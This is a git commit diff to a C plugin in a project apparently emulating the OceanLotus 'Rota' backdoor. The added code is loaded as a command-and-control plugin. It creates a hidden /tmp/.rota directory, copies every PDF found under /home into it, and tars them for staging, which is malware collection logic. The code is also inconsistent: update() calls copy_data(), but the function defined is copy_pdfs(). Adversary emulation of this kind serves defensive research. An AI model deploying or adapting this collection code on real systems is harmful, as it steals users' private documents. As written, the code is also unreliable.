e268f0e9c2d68fcc7c4051b4cf9be55800652139
Jared Stroud <1250113+archcloudlabs@users.noreply.github.com>
2023-08-02 17:39:19 -0400

    Adding staging data commands to execute;

--- ocean_lotus/rota/src/so.c
+++ ocean_lotus/rota/src/so.c
@@ -4,5 +4,19 @@
 // this is loaded via dlsym.
 // the argument to the rota_c2_run_plugin_1 command
 extern void update(void) {
-    system("id >/tmp/lol");
+    create_dir();
+    copy_data();
+    stage_data();
+}
+
+void create_dir() {
+    system("mkdir -p /tmp/.rota;");
+}
+
+void copy_pdfs() {
+    system("find /home/ -name \"*.pdf\" -exec cp {} /tmp/.rota/ \;");
+}
+
+void stage_data() {
+    system("cd /tmp/.rota; tar -czvf rota.tar.gz *");
 }
